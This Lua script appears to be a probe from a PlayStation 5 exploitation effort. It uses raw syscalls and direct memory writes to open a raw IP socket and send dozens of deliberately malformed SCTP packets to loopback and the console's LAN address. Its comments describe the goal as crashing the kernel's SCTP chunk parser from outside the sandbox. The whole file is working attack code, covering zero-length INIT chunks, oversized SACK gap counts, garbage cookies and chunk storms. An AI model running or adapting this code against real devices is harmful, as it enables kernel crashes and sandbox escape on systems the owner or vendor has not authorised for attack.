-- CRASH_CLASS: HIGH
-- PROBE 48b: SCTP Chunk Parser Fuzzing via Raw Socket Loopback
--
-- Context: Probe 48a confirmed SCTP raw sockets work (SOCK_RAW/proto 132).
-- Even though SCTP stream/seqpacket sockets are blocked by the sandbox,
-- the kernel's SCTP input parser (sctp_input → sctp_common_input_processing)
-- is still registered in the protocol switch table.
--
-- Attack: send crafted SCTP packets with malformed chunks to 127.0.0.1 via
-- raw IP socket with IP_HDRINCL. The kernel routes to loopback, ip_input()
-- dispatches to sctp_input() based on protocol=132, and the chunk parser
-- runs IN KERNEL CONTEXT with no sandbox filtering.
--
-- SCTP has had many FreeBSD CVEs: chunk length bugs, INIT parameter overflow,
-- cookie-echo state confusion, SACK gap block overflows.
--
-- A crash/reboot during this probe = kernel sctp_input() hit.

print("=== PROBE 48b: SCTP LOOPBACK FUZZ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function safe_ww(addr, val)
    local ok = pcall(function() memory.write_word(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_sendto = make_syscall(133)

-- ============================================
-- SECTION A: Create raw IP socket with IP_HDRINCL
-- ============================================
print("=== A: RAW SOCKET SETUP ===")

local ok_s, rv_s = pcall(function()
    return sc_socket(uint64(2), uint64(3), uint64(255))  -- AF_INET, SOCK_RAW, IPPROTO_RAW
end)
local raw_fd = ok_s and to_num(rv_s) or -1
print("raw socket: fd=" .. raw_fd)

if raw_fd < 0 then
    -- Try IPPROTO_SCTP raw
    ok_s, rv_s = pcall(function()
        return sc_socket(uint64(2), uint64(3), uint64(132))  -- IPPROTO_SCTP
    end)
    raw_fd = ok_s and to_num(rv_s) or -1
    print("SCTP raw socket: fd=" .. raw_fd)
end

if raw_fd < 0 then
    print("=== 48b DONE (no raw socket) ===")
    return
end

-- Enable IP_HDRINCL
local optval = memory.alloc(4)
safe_wd(optval, 1)
local ok_h, rv_h = pcall(function()
    return sc_setsockopt(uint64(raw_fd), uint64(0), uint64(2), uint64(optval), uint64(4))
end)
print("IP_HDRINCL: ret=" .. (ok_h and to_num(rv_h) or -999))

-- Destination: 127.0.0.1 (loopback)
local dst_sa = memory.alloc(16)
for i = 0, 15 do safe_wb(dst_sa + i, 0) end
safe_wb(dst_sa + 0, 16)    -- sin_len
safe_wb(dst_sa + 1, 2)     -- AF_INET
safe_wb(dst_sa + 4, 127)   -- 127.0.0.1
safe_wb(dst_sa + 5, 0)
safe_wb(dst_sa + 6, 0)
safe_wb(dst_sa + 7, 1)
print("")

-- ============================================
-- Helper: build an IP+SCTP packet in memory
-- ============================================
-- IP header (20 bytes) + SCTP data follows
local pkt = memory.alloc(2048)

local function build_ip_header(total_len)
    safe_wb(pkt + 0, 0x45)      -- version=4, ihl=5 (20 bytes)
    safe_wb(pkt + 1, 0)         -- TOS
    safe_wb(pkt + 2, math.floor(total_len / 256))  -- total length high
    safe_wb(pkt + 3, total_len % 256)               -- total length low
    safe_ww(pkt + 4, 0x1234)    -- identification
    safe_ww(pkt + 6, 0)         -- flags + frag offset
    safe_wb(pkt + 8, 64)        -- TTL
    safe_wb(pkt + 9, 132)       -- protocol = SCTP
    safe_ww(pkt + 10, 0)        -- checksum (kernel fills)
    -- src: 127.0.0.1
    safe_wb(pkt + 12, 127); safe_wb(pkt + 13, 0)
    safe_wb(pkt + 14, 0);   safe_wb(pkt + 15, 1)
    -- dst: 127.0.0.1
    safe_wb(pkt + 16, 127); safe_wb(pkt + 17, 0)
    safe_wb(pkt + 18, 0);   safe_wb(pkt + 19, 1)
end

-- SCTP common header: src_port(2) + dst_port(2) + vtag(4) + checksum(4) = 12 bytes
local function build_sctp_header(src_port, dst_port, vtag)
    local base = 20  -- after IP header
    safe_wb(pkt + base + 0, math.floor(src_port / 256))
    safe_wb(pkt + base + 1, src_port % 256)
    safe_wb(pkt + base + 2, math.floor(dst_port / 256))
    safe_wb(pkt + base + 3, dst_port % 256)
    -- vtag (4 bytes, big-endian)
    safe_wb(pkt + base + 4, math.floor(vtag / 0x1000000) % 256)
    safe_wb(pkt + base + 5, math.floor(vtag / 0x10000) % 256)
    safe_wb(pkt + base + 6, math.floor(vtag / 0x100) % 256)
    safe_wb(pkt + base + 7, vtag % 256)
    -- checksum = 0 (we'll see if kernel validates or not)
    safe_wd(pkt + base + 8, 0)
end

-- Write a chunk at offset (relative to SCTP header start at pkt+20)
local function write_chunk(offset, ctype, flags, length, data_bytes)
    local base = 20 + 12 + offset  -- IP(20) + SCTP hdr(12) + offset
    safe_wb(pkt + base + 0, ctype)
    safe_wb(pkt + base + 1, flags)
    safe_wb(pkt + base + 2, math.floor(length / 256))
    safe_wb(pkt + base + 3, length % 256)
    if data_bytes then
        for i = 1, #data_bytes do
            safe_wb(pkt + base + 4 + i - 1, data_bytes:byte(i))
        end
    end
end

-- Fill packet region with a byte
local function fill_pkt(start, len, byte)
    for i = start, start + len - 1 do
        safe_wb(pkt + i, byte)
    end
end

local function send_pkt(total_len, name)
    build_ip_header(total_len)
    local ok_tx, rv_tx = pcall(function()
        return sc_sendto(uint64(raw_fd), uint64(pkt), uint64(total_len),
            uint64(0), uint64(dst_sa), uint64(16))
    end)
    local ret = ok_tx and to_num(rv_tx) or -999
    print(string.format("  %-35s len=%d ret=%d", name, total_len, ret))
    return ret
end

-- ============================================
-- SECTION B: SCTP chunk parser attacks
-- ============================================
print("=== B: SCTP CHUNK PARSER ATTACKS ===")
print("Sending to 127.0.0.1 via raw socket + IP_HDRINCL")
print("Each variant targets sctp_input() chunk processing")
print("")

local variant = 0
local function next_var()
    variant = variant + 1
    return variant
end

-- B1: INIT chunk (type=1) — most complex parser path
-- INIT has: initiate_tag(4), a_rwnd(4), num_outbound(2), num_inbound(2), initial_tsn(4)
print("--- INIT variants ---")

-- Minimal valid INIT
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)  -- vtag=0 required for INIT
write_chunk(0, 1, 0, 20, nil)  -- INIT, len=20 (4 hdr + 16 init data)
-- Fill init data: tag=1, rwnd=65535, out=1, in=1, tsn=1
local init_base = 20 + 12 + 4  -- after chunk header
safe_wd(pkt + init_base, 0x01000000)    -- initiate tag (big endian 1)
safe_wd(pkt + init_base + 4, 0xFFFF0000)  -- a_rwnd
safe_ww(pkt + init_base + 8, 0x0100)    -- num outbound
safe_ww(pkt + init_base + 10, 0x0100)   -- num inbound
safe_wd(pkt + init_base + 12, 0x01000000)  -- initial TSN
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT minimal")

-- INIT with length 0 (parser killer)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 0, nil)  -- chunk length = 0!
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": INIT len=0")

-- INIT with length 3 (below minimum chunk header of 4)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 3, nil)
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": INIT len=3")

-- INIT with length 1 (tiny)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 1, nil)
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": INIT len=1")

-- INIT with huge length (0xFFFF but packet is small)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 0xFFFF, nil)
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT len=0xFFFF")

-- INIT with length 5 (between header min and INIT min)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 5, "\x00")
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": INIT len=5")

-- INIT with vtag != 0 (protocol violation)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xDEADBEEF)  -- vtag must be 0 for INIT
write_chunk(0, 1, 0, 20, nil)
safe_wd(pkt + init_base, 0x01000000)
safe_wd(pkt + init_base + 4, 0xFFFF0000)
safe_ww(pkt + init_base + 8, 0x0100)
safe_ww(pkt + init_base + 10, 0x0100)
safe_wd(pkt + init_base + 12, 0x01000000)
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT vtag!=0")

-- INIT with 0 outbound/inbound streams
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 20, nil)
safe_wd(pkt + init_base, 0x01000000)
safe_wd(pkt + init_base + 4, 0xFFFF0000)
safe_ww(pkt + init_base + 8, 0x0000)  -- 0 streams
safe_ww(pkt + init_base + 10, 0x0000)
safe_wd(pkt + init_base + 12, 0x01000000)
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT 0 streams")

-- INIT with 0xFFFF streams
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 20, nil)
safe_wd(pkt + init_base, 0x01000000)
safe_wd(pkt + init_base + 4, 0xFFFF0000)
safe_ww(pkt + init_base + 8, 0xFFFF)
safe_ww(pkt + init_base + 10, 0xFFFF)
safe_wd(pkt + init_base + 12, 0x01000000)
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT 0xFFFF streams")

-- INIT with a_rwnd = 0
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 20, nil)
safe_wd(pkt + init_base, 0x01000000)
safe_wd(pkt + init_base + 4, 0x00000000)  -- rwnd=0
safe_ww(pkt + init_base + 8, 0x0100)
safe_ww(pkt + init_base + 10, 0x0100)
safe_wd(pkt + init_base + 12, 0x01000000)
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT rwnd=0")
print("")

-- B11+: ABORT, SHUTDOWN, ERROR chunks
print("--- ABORT/SHUTDOWN/ERROR variants ---")

-- ABORT chunk (type=6) — should work without association
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xAAAAAAAA)
write_chunk(0, 6, 0, 4, nil)  -- ABORT, minimal
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": ABORT minimal")

-- ABORT with T-bit set (tag mismatch handling)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xAAAAAAAA)
write_chunk(0, 6, 0x01, 4, nil)  -- ABORT with T-bit
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": ABORT T-bit")

-- SHUTDOWN (type=7)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xBBBBBBBB)
write_chunk(0, 7, 0, 8, nil)  -- SHUTDOWN + cumulative TSN ack
safe_wd(pkt + 20 + 12 + 4, 0xFFFFFFFF)  -- cum TSN = max
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": SHUTDOWN cum_tsn=max")

-- ERROR (type=9) with cause code
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xCCCCCCCC)
write_chunk(0, 9, 0, 8, nil)
safe_ww(pkt + 20 + 12 + 4, 0x0100)  -- cause code 1
safe_ww(pkt + 20 + 12 + 6, 0x0400)  -- cause length 4
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": ERROR cause=1")

-- ERROR with length 0 cause
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xCCCCCCCC)
write_chunk(0, 9, 0, 8, nil)
safe_ww(pkt + 20 + 12 + 4, 0x0100)  -- cause code 1
safe_ww(pkt + 20 + 12 + 6, 0x0000)  -- cause length = 0!
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": ERROR cause_len=0")
print("")

-- B16+: HEARTBEAT, COOKIE chunks
print("--- HEARTBEAT/COOKIE variants ---")

-- HEARTBEAT_REQ (type=4) — kernel must parse heartbeat info TLV
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xDDDDDDDD)
write_chunk(0, 4, 0, 8, "\x00\x01\x00\x04")  -- heartbeat info param
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": HEARTBEAT_REQ")

-- HEARTBEAT with huge TLV
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xDDDDDDDD)
write_chunk(0, 4, 0, 0x80, nil)  -- 128 byte heartbeat
fill_pkt(20 + 12 + 4, 124, 0x41)  -- fill with 'A'
send_pkt(20 + 12 + 0x80, "B" .. next_var() .. ": HEARTBEAT huge")

-- COOKIE_ECHO (type=10) — kernel tries to validate cookie HMAC
fill_pkt(20, 200, 0xFF)
build_sctp_header(12345, 9899, 0)  -- vtag=0 ok for cookie echo
write_chunk(0, 10, 0, 100, nil)  -- 96 bytes of 0xFF "cookie"
send_pkt(20 + 12 + 100, "B" .. next_var() .. ": COOKIE_ECHO garbage")

-- COOKIE_ECHO with len=4 (empty cookie)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 10, 0, 4, nil)
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": COOKIE_ECHO empty")

-- COOKIE_ACK (type=11) without prior cookie exchange
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0xEEEEEEEE)
write_chunk(0, 11, 0, 4, nil)
send_pkt(20 + 12 + 4, "B" .. next_var() .. ": COOKIE_ACK no-assoc")
print("")

-- B21+: SACK chunk attacks
print("--- SACK variants ---")

-- SACK (type=3): cum_tsn(4) + a_rwnd(4) + num_gap(2) + num_dup(2) + gaps + dups
-- SACK with 0 gaps/dups
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x11111111)
write_chunk(0, 3, 0, 16, nil)
safe_wd(pkt + 20 + 12 + 4, 0x01000000)   -- cum_tsn = 1
safe_wd(pkt + 20 + 12 + 8, 0xFFFF0000)   -- a_rwnd = max
safe_ww(pkt + 20 + 12 + 12, 0x0000)      -- 0 gaps
safe_ww(pkt + 20 + 12 + 14, 0x0000)      -- 0 dups
send_pkt(20 + 12 + 16, "B" .. next_var() .. ": SACK minimal")

-- SACK claiming 100 gap blocks but packet too small
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x11111111)
write_chunk(0, 3, 0, 16, nil)
safe_wd(pkt + 20 + 12 + 4, 0x01000000)
safe_wd(pkt + 20 + 12 + 8, 0xFFFF0000)
safe_ww(pkt + 20 + 12 + 12, 0x6400)      -- 100 gaps (but no space!)
safe_ww(pkt + 20 + 12 + 14, 0x0000)
send_pkt(20 + 12 + 16, "B" .. next_var() .. ": SACK 100gaps no-space")

-- SACK with 0xFFFF gap blocks claimed
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x11111111)
write_chunk(0, 3, 0, 16, nil)
safe_wd(pkt + 20 + 12 + 4, 0x01000000)
safe_wd(pkt + 20 + 12 + 8, 0xFFFF0000)
safe_ww(pkt + 20 + 12 + 12, 0xFFFF)      -- max gaps
safe_ww(pkt + 20 + 12 + 14, 0xFFFF)      -- max dups
send_pkt(20 + 12 + 16, "B" .. next_var() .. ": SACK maxgaps maxdups")

-- SACK with length < minimum (12 bytes = too small for SACK)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x11111111)
write_chunk(0, 3, 0, 8, nil)  -- len=8, less than SACK min of 16
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": SACK undersized")
print("")

-- B25+: Multiple chunks in one packet
print("--- MULTI-CHUNK variants ---")

-- INIT + ABORT in same packet (protocol violation — INIT must be alone)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 20, nil)  -- INIT at offset 0
safe_wd(pkt + init_base, 0x02000000)
safe_wd(pkt + init_base + 4, 0xFFFF0000)
safe_ww(pkt + init_base + 8, 0x0100)
safe_ww(pkt + init_base + 10, 0x0100)
safe_wd(pkt + init_base + 12, 0x01000000)
write_chunk(20, 6, 0, 4, nil)  -- ABORT at offset 20
send_pkt(20 + 12 + 24, "B" .. next_var() .. ": INIT+ABORT same pkt")

-- Two INITs in one packet
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 20, nil)
safe_wd(pkt + init_base, 0x03000000)
safe_wd(pkt + init_base + 4, 0xFFFF0000)
safe_ww(pkt + init_base + 8, 0x0100)
safe_ww(pkt + init_base + 10, 0x0100)
safe_wd(pkt + init_base + 12, 0x01000000)
write_chunk(20, 1, 0, 20, nil)  -- second INIT
safe_wd(pkt + init_base + 20, 0x04000000)
safe_wd(pkt + init_base + 24, 0xFFFF0000)
safe_ww(pkt + init_base + 28, 0x0100)
safe_ww(pkt + init_base + 30, 0x0100)
safe_wd(pkt + init_base + 32, 0x01000000)
send_pkt(20 + 12 + 40, "B" .. next_var() .. ": double INIT")

-- 50 minimal chunks (chunk storm)
fill_pkt(20, 500, 0)
build_sctp_header(12345, 9899, 0x22222222)
for i = 0, 49 do
    write_chunk(i * 4, 6, 0, 4, nil)  -- 50 ABORT chunks
end
send_pkt(20 + 12 + 200, "B" .. next_var() .. ": 50 ABORT chunks")

-- Chunk chain with incrementing types (0-15)
fill_pkt(20, 300, 0)
build_sctp_header(12345, 9899, 0x33333333)
for i = 0, 15 do
    write_chunk(i * 8, i, 0xFF, 8, "\xDE\xAD\xBE\xEF")
end
send_pkt(20 + 12 + 128, "B" .. next_var() .. ": types 0-15 chain")
print("")

-- B29+: Unknown/reserved chunk types
print("--- UNKNOWN CHUNK TYPES ---")

for _, ctype in ipairs({128, 191, 192, 254, 255, 62, 63, 64, 127}) do
    fill_pkt(20, 100, 0)
    build_sctp_header(12345, 9899, 0x44444444)
    write_chunk(0, ctype, 0, 20, nil)
    fill_pkt(20 + 12 + 4, 16, 0xCC)
    send_pkt(20 + 12 + 20, "B" .. next_var() .. ": chunk type=" .. ctype)
end
print("")

-- B38+: FORWARD_TSN (type=192) — often poorly validated
print("--- FORWARD_TSN variants ---")

-- Forward TSN with no streams
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x55555555)
write_chunk(0, 192, 0, 8, nil)
safe_wd(pkt + 20 + 12 + 4, 0xFFFFFFFF)  -- new_cum_tsn = max
send_pkt(20 + 12 + 8, "B" .. next_var() .. ": FWD_TSN max")

-- Forward TSN with claimed many streams but small packet
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x55555555)
write_chunk(0, 192, 0, 200, nil)  -- claim 200 bytes
safe_wd(pkt + 20 + 12 + 4, 0x01000000)
-- Fill "stream info" (4 bytes each: stream_id + stream_seq)
for i = 0, 47 do
    safe_ww(pkt + 20 + 12 + 8 + i * 4, 0xFFFF)      -- stream_id
    safe_ww(pkt + 20 + 12 + 8 + i * 4 + 2, 0xFFFF)  -- stream_seq
end
send_pkt(20 + 12 + 200, "B" .. next_var() .. ": FWD_TSN 48 streams")
print("")

-- ============================================
-- SECTION C: SCTP to PS5's own LAN IP (different path)
-- ============================================
print("=== C: SCTP TO LAN IP (10.0.0.96) ===")
-- Some kernels handle loopback differently from LAN delivery
-- Send the most dangerous variants to the LAN IP too

local lan_sa = memory.alloc(16)
for i = 0, 15 do safe_wb(lan_sa + i, 0) end
safe_wb(lan_sa + 0, 16)
safe_wb(lan_sa + 1, 2)       -- AF_INET
safe_wb(lan_sa + 4, 10)      -- 10.0.0.96
safe_wb(lan_sa + 5, 0)
safe_wb(lan_sa + 6, 0)
safe_wb(lan_sa + 7, 96)

-- Change dst in IP header too
local function send_pkt_lan(total_len, name)
    build_ip_header(total_len)
    -- Override dst to 10.0.0.96
    safe_wb(pkt + 16, 10); safe_wb(pkt + 17, 0)
    safe_wb(pkt + 18, 0);  safe_wb(pkt + 19, 96)
    local ok_tx, rv_tx = pcall(function()
        return sc_sendto(uint64(raw_fd), uint64(pkt), uint64(total_len),
            uint64(0), uint64(lan_sa), uint64(16))
    end)
    local ret = ok_tx and to_num(rv_tx) or -999
    print(string.format("  %-35s len=%d ret=%d", name, total_len, ret))
    return ret
end

-- INIT len=0 (most dangerous)
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 0, nil)
send_pkt_lan(20 + 12 + 4, "C1: INIT len=0 → LAN")

-- INIT len=1
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 1, 0, 1, nil)
send_pkt_lan(20 + 12 + 4, "C2: INIT len=1 → LAN")

-- COOKIE garbage
fill_pkt(20, 200, 0xFF)
build_sctp_header(12345, 9899, 0)
write_chunk(0, 10, 0, 100, nil)
send_pkt_lan(20 + 12 + 100, "C3: COOKIE garbage → LAN")

-- SACK max gaps
fill_pkt(20, 200, 0)
build_sctp_header(12345, 9899, 0x11111111)
write_chunk(0, 3, 0, 16, nil)
safe_wd(pkt + 20 + 12 + 4, 0x01000000)
safe_wd(pkt + 20 + 12 + 8, 0xFFFF0000)
safe_ww(pkt + 20 + 12 + 12, 0xFFFF)
safe_ww(pkt + 20 + 12 + 14, 0xFFFF)
send_pkt_lan(20 + 12 + 16, "C4: SACK maxgaps → LAN")

-- 50 ABORT storm
fill_pkt(20, 500, 0)
build_sctp_header(12345, 9899, 0x22222222)
for i = 0, 49 do
    write_chunk(i * 4, 6, 0, 4, nil)
end
send_pkt_lan(20 + 12 + 200, "C5: 50 ABORTs → LAN")
print("")

-- ============================================
-- SECTION D: Summary
-- ============================================
print("=== D: SUMMARY ===")
print("Total variants sent: " .. variant)
print("")
print("If the console rebooted during this probe, check which variant")
print("was the last to print before the crash.")
print("")
print("Key targets if any crashed:")
print("  INIT len=0/1  → chunk_length validation in sctp_process_init")
print("  SACK maxgaps  → gap block parsing overflow")
print("  COOKIE garbage → HMAC validation / cookie processing")
print("  FWD_TSN        → stream iteration overflow")
print("  50 ABORTs      → chunk iteration stress")

pcall(function() sc_close(uint64(raw_fd)) end)
print("")
print("=== PROBE 48b COMPLETE ===")
